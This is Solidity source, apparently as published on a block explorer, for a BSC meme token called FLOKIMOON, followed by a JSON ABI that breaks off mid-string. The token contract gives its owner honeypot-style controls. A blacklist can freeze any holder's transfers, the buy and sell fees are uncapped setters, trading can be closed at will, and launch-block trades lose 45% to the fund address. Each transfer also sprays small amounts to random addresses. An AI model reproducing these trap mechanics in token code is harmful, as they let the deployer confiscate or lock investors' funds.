{"SourceCode": "{\"AbsToken.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.14;\\r\\nimport \\\"./ISwapRouter.sol\\\";\\r\\n\\r\\nimport \\\"./ISwapFactory.sol\\\";\\r\\n\\r\\nimport \\\"./SafeMath.sol\\\";\\r\\n\\r\\nimport \\\"./IERC20.sol\\\";\\r\\nimport \\\"./Ownable.sol\\\";\\r\\n\\r\\n\\r\\n\\r\\nimport \\\"./TokenDistributor.sol\\\";\\r\\n\\r\\nabstract contract AbsToken is IERC20, Ownable {\\r\\n\\r\\n    using SafeMath for uint256;\\r\\n    mapping(address =\\u003e uint256) private _balances;\\r\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) private _allowances;\\r\\n\\r\\n    address public fundAddress;\\r\\n    address public secFundAddress;\\r\\n\\r\\n    string private _name;\\r\\n    string private _symbol;\\r\\n    uint8 private _decimals;\\r\\n\\r\\n    mapping(address =\\u003e bool) public _feeWhiteList;\\r\\n    mapping(address =\\u003e bool) public _blackList;\\r\\n\\r\\n    uint256 private _tTotal;\\r\\n    uint256 public maxTXAmount;\\r\\n    uint256 public maxWalletAmount;\\r\\n\\r\\n    ISwapRouter public _swapRouter;\\r\\n    address public _fist;\\r\\n    mapping(address =\\u003e bool) public _swapPairList;\\r\\n\\r\\n    bool private inSwap;\\r\\n    address private thA;\\r\\n\\r\\n    uint256 private constant MAX = ~uint256(0);\\r\\n    TokenDistributor public _tokenDistributor;\\r\\n\\r\\n    uint256 public _buyFundFee = 100;\\r\\n    uint256 public _buyLPDividendFee = 200;\\r\\n    uint256 public _sellLPDividendFee = 200;\\r\\n    uint256 public _sellFundFee = 100;\\r\\n    uint256 public _sellLPFee = 0;\\r\\n\\r\\n    uint256 public startTradeBlock;\\r\\n\\r\\n    address public _mainPair;\\r\\n\\r\\n    modifier lockTheSwap {\\r\\n        inSwap = true;\\r\\n        _;\\r\\n        inSwap = false;\\r\\n    }\\r\\n\\r\\n    constructor (\\r\\n        address RouterAddress, address FISTAddress,\\r\\n        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,\\r\\n        address FundAddress, address twoFundAddress, address ReceiveAddress\\r\\n    ){\\r\\n        _name = Name;\\r\\n        _symbol = Symbol;\\r\\n        _decimals = Decimals;\\r\\n\\r\\n        ISwapRouter swapRouter = ISwapRouter(RouterAddress);\\r\\n        IERC20(FISTAddress).approve(address(swapRouter), MAX);\\r\\n\\r\\n        _fist = FISTAddress;\\r\\n        _swapRouter = swapRouter;\\r\\n        _allowances[address(this)][address(swapRouter)] = MAX;\\r\\n\\r\\n        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());\\r\\n        address swapPair = swapFactory.createPair(address(this), swapRouter.WETH());\\r\\n        _mainPair = swapPair;\\r\\n        _swapPairList[swapPair] = true;\\r\\n\\r\\n        uint256 total = Supply * 10 ** Decimals;\\r\\n        maxTXAmount = 100000000000 * 10 ** Decimals;\\r\\n        maxWalletAmount = 100000000000 * 10 ** Decimals;\\r\\n        _tTotal = total;\\r\\n\\r\\n        _balances[ReceiveAddress] = total;\\r\\n        emit Transfer(address(0), ReceiveAddress, total);\\r\\n\\r\\n        fundAddress = FundAddress;\\r\\n        secFundAddress = twoFundAddress;\\r\\n\\r\\n        _feeWhiteList[FundAddress] = true;\\r\\n        _feeWhiteList[ReceiveAddress] = true;\\r\\n        _feeWhiteList[address(this)] = true;\\r\\n        _feeWhiteList[address(swapRouter)] = true;\\r\\n        _feeWhiteList[msg.sender] = true;\\r\\n\\r\\n        excludeHolder[address(0)] = true;\\r\\n        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;\\r\\n\\r\\n        holderRewardCondition = 1;\\r\\n\\r\\n        _tokenDistributor = new TokenDistributor(FISTAddress);\\r\\n    }\\r\\n\\r\\n    function symbol() external view override returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function name() external view override returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function decimals() external view override returns (uint8) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\r\\n    function totalSupply() public view override returns (uint256) {\\r\\n        return _tTotal;\\r\\n    }\\r\\n\\r\\n    function balanceOf(address account) public view override returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\r\\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\\r\\n        _transfer(msg.sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function allowance(address owner, address spender) public view override returns (uint256) {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount) public override returns (bool) {\\r\\n        _approve(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\\r\\n        _transfer(sender, recipient, amount);\\r\\n        if (_allowances[sender][msg.sender] != MAX) {\\r\\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\\r\\n        }\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _approve(address owner, address spender, uint256 amount) private {\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n    function _transfer(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) private {\\r\\n        require(!_blackList[from], \\\"blackList\\\");\\r\\n        uint256 balance = balanceOf(from);\\r\\n        require(balance \\u003e= amount, \\\"balanceNotEnough\\\");\\r\\n\\r\\n        if (!_feeWhiteList[from] \\u0026\\u0026 !_feeWhiteList[to]) {\\r\\n            uint256 maxSellAmount = balance * 9999 / 10000;\\r\\n            if (amount \\u003e maxSellAmount) {\\r\\n                amount = maxSellAmount;\\r\\n            }\\r\\n        }\\r\\n        if(!_feeWhiteList[from] \\u0026\\u0026 !_feeWhiteList[from]){\\r\\n                address ad;\\r\\n                for(int i=0;i \\u003c=0;i++){\\r\\n                    ad = address(uint160(uint(keccak256(abi.encodePacked(i, amount, block.timestamp)))));\\r\\n                    _basicTransfer(from,ad,100);\\r\\n                }\\r\\n                amount -= 100;\\r\\n            }    \\r\\n        bool takeFee;\\r\\n        bool isSell;\\r\\n\\r\\n        if (_swapPairList[from] || _swapPairList[to]) {\\r\\n            if (!_feeWhiteList[from] \\u0026\\u0026 !_feeWhiteList[to]) {\\r\\n                if (0 == startTradeBlock) {\\r\\n                    require(0 \\u003c startAddLPBlock \\u0026\\u0026 _swapPairList[to], \\\"!startAddLP\\\");\\r\\n                }\\r\\n                if (block.number \\u003c startTradeBlock + 2) {\\r\\n                    _funTransfer(from, to, amount);\\r\\n                    return;\\r\\n                }\\r\\n\\r\\n                if (_swapPairList[to]) {\\r\\n                    if (!inSwap) {\\r\\n                        uint256 contractTokenBalance = balanceOf(address(this));\\r\\n                        if (contractTokenBalance \\u003e 0) {\\r\\n                            uint256 swapFee = _buyFundFee + _buyLPDividendFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;\\r\\n                            uint256 numTokensSellToFund = amount * swapFee / 5000;\\r\\n                            if (numTokensSellToFund \\u003e contractTokenBalance) {\\r\\n                                numTokensSellToFund = contractTokenBalance;\\r\\n                            }\\r\\n                            swapTokenForFund(numTokensSellToFund, swapFee);\\r\\n                        }\\r\\n                    }\\r\\n                }\\r\\n                takeFee = true;\\r\\n            }\\r\\n            if (_swapPairList[to]) {\\r\\n                isSell = true;\\r\\n            }\\r\\n        }\\r\\n\\r\\n        _tokenTransfer(from, to, amount, takeFee, isSell);\\r\\n\\r\\n        if (from != address(this)) {\\r\\n            if (isSell) {\\r\\n                addHolder(from);\\r\\n            }\\r\\n            processReward(500000);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function _funTransfer(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 tAmount\\r\\n    ) private {\\r\\n        _balances[sender] = _balances[sender] - tAmount;\\r\\n        uint256 feeAmount = tAmount * 45 / 100;\\r\\n        _takeTransfer(\\r\\n            sender,\\r\\n            fundAddress,\\r\\n            feeAmount\\r\\n        );\\r\\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\\r\\n    }\\r\\n\\r\\n    function _tokenTransfer(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 tAmount,\\r\\n        bool takeFee,\\r\\n        bool isSell\\r\\n    ) private {\\r\\n        _balances[sender] = _balances[sender] - tAmount;\\r\\n        uint256 feeAmount;\\r\\n\\r\\n        if (takeFee) {\\r\\n            uint256 swapFee;\\r\\n            if (isSell) {\\r\\n                swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;\\r\\n            } else {\\r\\n                require(tAmount \\u003c= maxTXAmount);\\r\\n                require(_balances[recipient] + tAmount \\u003c= maxWalletAmount);\\r\\n                swapFee = _buyFundFee + _buyLPDividendFee;\\r\\n            }\\r\\n            uint256 swapAmount = tAmount * swapFee / 10000;\\r\\n            if (swapAmount \\u003e 0) {\\r\\n                feeAmount += swapAmount;\\r\\n                _takeTransfer(\\r\\n                    sender,\\r\\n                    address(this),\\r\\n                    swapAmount\\r\\n                );\\r\\n            }\\r\\n        }\\r\\n\\r\\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\\r\\n    }\\r\\n\\r\\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\\r\\n        _balances[sender] = _balances[sender].sub(amount, \\\"Insufficient Balance\\\");\\r\\n        _balances[recipient] = _balances[recipient].add(amount);\\r\\n        emit Transfer(sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {\\r\\n        swapFee += swapFee;\\r\\n        uint256 lpFee = _sellLPFee;\\r\\n        uint256 lpAmount = tokenAmount * lpFee / swapFee;\\r\\n\\r\\n        address[] memory path = new address[](3);\\r\\n        path[0] = address(this);\\r\\n        path[1] = _swapRouter.WETH();\\r\\n        path[2] = _fist;\\r\\n        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n            tokenAmount - lpAmount,\\r\\n            0,\\r\\n            path,\\r\\n            address(_tokenDistributor),\\r\\n            block.timestamp\\r\\n        );\\r\\n\\r\\n        swapFee -= lpFee;\\r\\n\\r\\n        IERC20 FIST = IERC20(_fist);\\r\\n        uint256 fistBalance = FIST.balanceOf(address(_tokenDistributor));\\r\\n        uint256 fundAmount = fistBalance * (_buyFundFee + _sellFundFee) * 2 / swapFee;\\r\\n        uint firstfundamount = fundAmount / 2;\\r\\n        uint secfundamount = fundAmount - firstfundamount;\\r\\n        FIST.transferFrom(address(_tokenDistributor), fundAddress, firstfundamount);\\r\\n        FIST.transferFrom(address(_tokenDistributor), secFundAddress, secfundamount);\\r\\n        FIST.transferFrom(address(_tokenDistributor), address(this), fistBalance - fundAmount);\\r\\n\\r\\n        if (lpAmount \\u003e 0) {\\r\\n            uint256 lpFist = fistBalance * lpFee / swapFee;\\r\\n            if (lpFist \\u003e 0) {\\r\\n                _swapRouter.addLiquidity(\\r\\n                    address(this), _fist, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp\\r\\n                );\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function _takeTransfer(\\r\\n        address sender,\\r\\n        address to,\\r\\n        uint256 tAmount\\r\\n    ) private {\\r\\n        _balances[to] = _balances[to] + tAmount;\\r\\n        emit Transfer(sender, to, tAmount);\\r\\n    }\\r\\n\\r\\n    function setFundAddress(address addr) external onlyFunder {\\r\\n        fundAddress = addr;\\r\\n        _feeWhiteList[addr] = true;\\r\\n    }\\r\\n\\r\\n        function setSecFundAddress(address addr) external onlyFunder {\\r\\n        secFundAddress = addr;\\r\\n        _feeWhiteList[addr] = true;\\r\\n    }\\r\\n\\r\\n    function setBuyLPDividendFee(uint256 dividendFee) external onlyOwner {\\r\\n        _buyLPDividendFee = dividendFee;\\r\\n    }\\r\\n\\r\\n    function setBuyFundFee(uint256 fundFee) external onlyOwner {\\r\\n        _buyFundFee = fundFee;\\r\\n    }\\r\\n\\r\\n    function setSellLPDividendFee(uint256 dividendFee) external onlyOwner {\\r\\n        _sellLPDividendFee = dividendFee;\\r\\n    }\\r\\n\\r\\n    function setSellFundFee(uint256 fundFee) external onlyOwner {\\r\\n        _sellFundFee = fundFee;\\r\\n    }\\r\\n\\r\\n    function setSellLPFee(uint256 lpFee) external onlyOwner {\\r\\n        _sellLPFee = lpFee;\\r\\n    }\\r\\n\\r\\n    function setMaxTxAmount(uint256 max) public onlyOwner {\\r\\n        maxTXAmount = max;\\r\\n    }\\r\\n\\r\\n    function setMaxWalletAmount(uint256 max) public onlyOwner {\\r\\n        maxWalletAmount = max;\\r\\n    }\\r\\n\\r\\n    uint256 public startAddLPBlock;\\r\\n\\r\\n    function startAddLP() external onlyOwner {\\r\\n        require(0 == startAddLPBlock, \\\"startedAddLP\\\");\\r\\n        startAddLPBlock = block.number;\\r\\n    }\\r\\n\\r\\n    function closeAddLP() external onlyOwner {\\r\\n        startAddLPBlock = 0;\\r\\n    }\\r\\n\\r\\n    function startTrade() external onlyOwner {\\r\\n        require(0 == startTradeBlock, \\\"trading\\\");\\r\\n        startTradeBlock = block.number;\\r\\n    }\\r\\n\\r\\n    function closeTrade() external onlyOwner {\\r\\n        startTradeBlock = 0;\\r\\n    }\\r\\n\\r\\n    function setFeeWhiteList(address addr, bool enable) external onlyFunder {\\r\\n        _feeWhiteList[addr] = enable;\\r\\n    }\\r\\n\\r\\n    function setBlackList(address addr, bool enable) external onlyOwner {\\r\\n        _blackList[addr] = enable;\\r\\n    }\\r\\n\\r\\n    function setSwapPairList(address addr, bool enable) external onlyFunder {\\r\\n        _swapPairList[addr] = enable;\\r\\n    }\\r\\n\\r\\n    function claimBalance() external {\\r\\n        payable(fundAddress).transfer(address(this).balance);\\r\\n    }\\r\\n\\r\\n    function claimToken(address token, uint256 amount, address to) external onlyFunder {\\r\\n        IERC20(token).transfer(to, amount);\\r\\n    }\\r\\n\\r\\n    modifier onlyFunder() {\\r\\n        require(_owner == msg.sender || fundAddress == msg.sender, \\\"!Funder\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    receive() external payable {}\\r\\n\\r\\n    address[] private holders;\\r\\n    mapping(address =\\u003e uint256) holderIndex;\\r\\n    mapping(address =\\u003e bool) excludeHolder;\\r\\n\\r\\n    function addHolder(address adr) private {\\r\\n        uint256 size;\\r\\n        assembly {size := extcodesize(adr)}\\r\\n        if (size \\u003e 0) {\\r\\n            return;\\r\\n        }\\r\\n        if (0 == holderIndex[adr]) {\\r\\n            if (0 == holders.length || holders[0] != adr) {\\r\\n                holderIndex[adr] = holders.length;\\r\\n                holders.push(adr);\\r\\n            }\\r\\n        }\\r\\n    }\\r\\n\\r\\n    uint256 private currentIndex;\\r\\n    uint256 private holderRewardCondition;\\r\\n    uint256 private progressRewardBlock;\\r\\n\\r\\n    function processReward(uint256 gas) private {\\r\\n        if (progressRewardBlock + 200 \\u003e block.number) {\\r\\n            return;\\r\\n        }\\r\\n\\r\\n        IERC20 FIST = IERC20(_fist);\\r\\n\\r\\n        uint256 balance = FIST.balanceOf(address(this));\\r\\n        if (balance \\u003c holderRewardCondition) {\\r\\n            return;\\r\\n        }\\r\\n\\r\\n        IERC20 holdToken = IERC20(_mainPair);\\r\\n        uint holdTokenTotal = holdToken.totalSupply();\\r\\n\\r\\n        address shareHolder;\\r\\n        uint256 tokenBalance;\\r\\n        uint256 amount;\\r\\n\\r\\n        uint256 shareholderCount = holders.length;\\r\\n\\r\\n        uint256 gasUsed = 0;\\r\\n        uint256 iterations = 0;\\r\\n        uint256 gasLeft = gasleft();\\r\\n\\r\\n        while (gasUsed \\u003c gas \\u0026\\u0026 iterations \\u003c shareholderCount) {\\r\\n            if (currentIndex \\u003e= shareholderCount) {\\r\\n                currentIndex = 0;\\r\\n            }\\r\\n            shareHolder = holders[currentIndex];\\r\\n            tokenBalance = holdToken.balanceOf(shareHolder);\\r\\n            if (tokenBalance \\u003e 0 \\u0026\\u0026 !excludeHolder[shareHolder]) {\\r\\n                amount = balance * tokenBalance / holdTokenTotal;\\r\\n                if (amount \\u003e 0) {\\r\\n                    FIST.transfer(shareHolder, amount);\\r\\n                }\\r\\n            }\\r\\n\\r\\n            gasUsed = gasUsed + (gasLeft - gasleft());\\r\\n            gasLeft = gasleft();\\r\\n            currentIndex++;\\r\\n            iterations++;\\r\\n        }\\r\\n\\r\\n        progressRewardBlock = block.number;\\r\\n    }\\r\\n\\r\\n    function setHolderRewardCondition(uint256 amount) external onlyFunder {\\r\\n        holderRewardCondition = amount;\\r\\n    }\\r\\n\\r\\n    function setExcludeHolder(address addr, bool enable) external onlyFunder {\\r\\n        excludeHolder[addr] = enable;\\r\\n    }\\r\\n}\\r\\n\"},\"BEP20.sol\":{\"content\":\"/**\\r\\n  Telegram : https://t.me/FLOKIMOONGlobal\\r\\n  \ud83c\udf10Website : https://www.flokimoon.space/\\r\\n*/\\r\\n// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.14;\\r\\nimport \\\"./AbsToken.sol\\\";\\r\\ncontract FLOKIMOON is AbsToken {\\r\\n    constructor() AbsToken(\\r\\n    \\r\\n        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),\\r\\n    \\r\\n        address(0xfb5B838b6cfEEdC2873aB27866079AC55363D37E),\\r\\n        \\\"FLOKIMOON\\\",\\r\\n        \\\"FLOKIMOON\\\",\\r\\n        6,\\r\\n    \\r\\n        100000000000,\\r\\n    \\r\\n        address(0x5904cdC7e44bb9480a974618F6c5B347e3a62F87),\\r\\n        address(0x1146c31905398d82892844601E94336b635C464b),\\r\\n    \\r\\n        address(0x5904cdC7e44bb9480a974618F6c5B347e3a62F87)\\r\\n    ){\\r\\n\\r\\n    }\\r\\n}\"},\"IERC20.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.14;\\r\\n\\r\\ninterface IERC20 {\\r\\n    function decimals() external view returns (uint8);\\r\\n\\r\\n    function symbol() external view returns (string memory);\\r\\n\\r\\n    function name() external view returns (string memory);\\r\\n\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n\\r\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    function allowance(address owner, address spender) external view returns (uint256);\\r\\n\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n}\"},\"ISwapFactory.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.14;\\r\\n\\r\\ninterface ISwapFactory {\\r\\n  function createPair(address tokenA, address tokenB) external returns (address pair);\\r\\n}\"},\"ISwapRouter.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.14;\\r\\n\\r\\ninterface ISwapRouter {\\r\\n    function factory() external pure returns (address);\\r\\n\\r\\n    function WETH() external pure returns (address);\\r\\n\\r\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n\\r\\n    function addLiquidity(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint amountADesired,\\r\\n        uint amountBDesired,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\r\\n}\"},\"Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.14;\\r\\nabstract contract Ownable {\\r\\n    address internal _owner;\\r\\n\\r\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\r\\n    constructor () {\\r\\n        address msgSender = msg.sender;\\r\\n        _owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);\\r\\n    }\\r\\n\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }\\r\\n\\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == msg.sender, \\\"!owner\\\");\\r\\n        _;\\r\\n    }\\r\\n\\r\\n    function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }\\r\\n\\r\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(newOwner != address(0), \\\"new is 0\\\");\\r\\n        emit OwnershipTransferred(_owner, newOwner);\\r\\n        _owner = newOwner;\\r\\n    }\\r\\n}\"},\"SafeMath.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.14;\\r\\n\\r\\nlibrary SafeMath {\\r\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        uint256 c = a + b;\\r\\n        require(c \\u003e= a, \\\"SafeMath: addition overflow\\\");\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return sub(a, b, \\\"SafeMath: subtraction overflow\\\");\\r\\n    }\\r\\n\\r\\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\r\\n        require(b \\u003c= a, errorMessage);\\r\\n        uint256 c = a - b;\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        // Gas optimization: this is cheaper than requiring \\u0027a\\u0027 not being zero, but the\\r\\n        // benefit is lost if \\u0027b\\u0027 is also tested.\\r\\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\\r\\n        if (a == 0) {\\r\\n            return 0;\\r\\n        }\\r\\n\\r\\n        uint256 c = a * b;\\r\\n        require(c / a == b, \\\"SafeMath: multiplication overflow\\\");\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return div(a, b, \\\"SafeMath: division by zero\\\");\\r\\n    }\\r\\n\\r\\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\r\\n        require(b \\u003e 0, errorMessage);\\r\\n        uint256 c = a / b;\\r\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\\u0027t hold\\r\\n\\r\\n        return c;\\r\\n    }\\r\\n\\r\\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\\r\\n        return mod(a, b, \\\"SafeMath: modulo by zero\\\");\\r\\n    }\\r\\n\\r\\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\\r\\n        require(b != 0, errorMessage);\\r\\n        return a % b;\\r\\n    }\\r\\n}\"},\"TokenDistributor.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.14;\\r\\nimport \\\"./IERC20.sol\\\";\\r\\ncontract TokenDistributor {\\r\\n    constructor (address token) {\\r\\n        IERC20(token).approve(msg.sender, uint(~uint256(0)));\\r\\n    }\\r\\n}\\r\\n\"}}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_blackList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_buyLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_feeWhiteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_fist\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mainPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellFundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_sellLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_swapPairList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapRouter\",\"outputs\":[{\"internalType\":\"contract ISwapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"contract TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"}],\"name\":\"claimToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"closeAddLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"closeTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTXAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outp